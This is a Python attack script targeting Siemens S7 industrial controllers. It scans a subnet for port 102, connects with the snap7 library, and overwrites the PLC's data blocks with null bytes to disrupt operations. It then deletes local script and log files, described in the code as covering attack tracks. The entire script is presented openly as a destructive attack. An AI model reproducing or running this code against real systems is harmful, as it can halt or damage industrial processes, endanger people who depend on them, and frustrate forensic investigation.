import snap7
import scapy.all as scapy
import os
import time

# -------------- STEP 1: FIND THE PLC'S IP ADDRESS --------------
def find_plc_ip():
    """Scans the network for a Siemens PLC using Port 102 (S7Comm)."""
    print("[*] Scanning for Siemens PLC on the network...")
    
    # Define the network range (manual configuration required)
    subnet = "192.168.1.0/24"  # Adjust this to match your network

    # Scan for devices responding on port 102 (Siemens S7 Default)
    ans, _ = scapy.sr(scapy.IP(dst=subnet)/scapy.TCP(dport=102, flags="S"), timeout=2, verbose=0)

    plc_ip = None
    for sent, received in ans:
        if received.haslayer(scapy.TCP) and received.getlayer(scapy.TCP).sport == 102:
            plc_ip = received.getlayer(scapy.IP).src
            print(f"[+] Found Siemens S7-1200 PLC at {plc_ip}")
            break

    if not plc_ip:
        print("[-] No PLC found. Exiting.")
        exit(1)

    return plc_ip

# -------------- STEP 2: CONNECT TO PLC --------------
def connect_to_plc(ip):
    """Connect to the PLC using the Snap7 library."""
    plc = snap7.client.Client()
    try:
        plc.connect(ip, 0, 1)  # Rack 0, Slot 1 (default for S7-1200 PLC)
        print(f"[+] Connected to PLC at {ip}")
        return plc
    except Exception as e:
        print(f"[-] Failed to connect to PLC: {e}")
        exit(1)

# -------------- STEP 3: ERASE PLC MEMORY (DESTRUCTIVE ACTION) --------------
def destroy_plc_memory(plc):
    """Erases PLC memory (Data Blocks - DB) to disrupt operations."""
    
    print("[!] WARNING: Performing data destruction on PLC!")
    time.sleep(2)  # Small delay before action

    try:
        for db_number in range(1, 10):  # Change range based on known DBs
            plc.db_write(db_number, 0, b'\x00' * 256)  # Overwrite memory with zeros
            print(f"[*] Overwrote DB{db_number} with null bytes.")
        
        plc.set_session_password("")  # Reset session password (optional)
        plc.upload(0)  # Attempt to reset PLC (may fail depending on settings)
        
        print("[+] PLC memory wiped successfully.")

    except Exception as ex:
        print(f"[-] Failed to erase memory: {ex}")

# -------------- STEP 4: DESTROY LOCAL FILES (ANTI-FORENSICS) --------------
def destroy_local_files():
    """Deletes malicious scripts and traces to cover attack tracks."""
    
    print("[!] Cleaning up local traces...")
    
    files_to_delete = ["malicious_script.py", "attack_log.txt"]
    
    for file in files_to_delete:
        try:
            if os.path.exists(file):
                os.remove(file)
                print(f"[+] Deleted {file}")
            else:
                print(f"[-] File {file} not found.")
        except Exception as e:
            print(f"[-] Failed to delete {file}: {e}")

# -------------------- EXECUTE ATTACK --------------------
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    plc = connect_to_plc(plc_ip)
    destroy_plc_memory(plc)
    destroy_local_files()
    print("[*] Data destruction complete. Exiting.")